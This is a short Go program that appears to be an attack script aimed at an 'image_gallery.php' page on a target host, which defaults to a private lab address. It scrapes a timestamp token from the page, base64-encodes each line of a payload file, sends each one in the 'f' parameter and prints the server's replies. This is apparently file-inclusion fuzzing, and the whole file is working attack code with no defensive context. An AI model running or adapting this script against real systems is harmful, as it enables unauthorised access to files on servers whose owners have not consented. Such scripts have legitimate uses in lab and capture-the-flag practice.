package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/spf13/pflag"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
)

var ipAddr = pflag.StringP("ipAddr", "i", "192.168.1.7", "Input ip address")
var payloadTxt = pflag.StringP("payloadTxt", "p", "payload.txt", "Input payload file name")

func main() {
	pflag.Parse()
	url := "http://" + *ipAddr + "/image_gallery.php"
	fmt.Println(url)
	fmt.Println(*payloadTxt)
	response, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()
	body, err := io.ReadAll(response.Body)
	timeStamp := findMustCompile(body)[0][1]
	fmt.Println("time stamp:", string(timeStamp))

	f, err := os.Open(*payloadTxt)
	if err != nil {
		fmt.Println("err:", err)
		return
	}
	defer f.Close()

	for _, item := range readTxt2(f) {
		item := strings.Trim(strings.Trim(string(item), "\r"), "\n")
		//fmt.Println(index)
		//fmt.Println(item)
		base64Payload := base64.StdEncoding.EncodeToString([]byte(item))
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("NewRequest error: ", err)
		}
		q := req.URL.Query()
		q.Add("t", string(timeStamp))
		q.Add("f", string(base64Payload))
		req.URL.RawQuery = q.Encode()
		var resp *http.Response
		resp, err = http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("network request error:", err)
		}
		//fmt.Println(resp.Body)
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("read response body err: ", err)
		}
		fmt.Println("repsone body: ", string(body))
		defer resp.Body.Close()

	}
}

func readTxt2(r io.Reader) []string {
	scanner := bufio.NewScanner(r)
	var payloads []string
	for scanner.Scan() {
		payloads = append(payloads, scanner.Text())
	}
	return payloads
}

func findMustCompile(targetString []byte) [][][]byte {
	flysnowRegexp := regexp.MustCompile(`t=(.*?)&f`)
	return flysnowRegexp.FindAllSubmatch(targetString, -1)
}
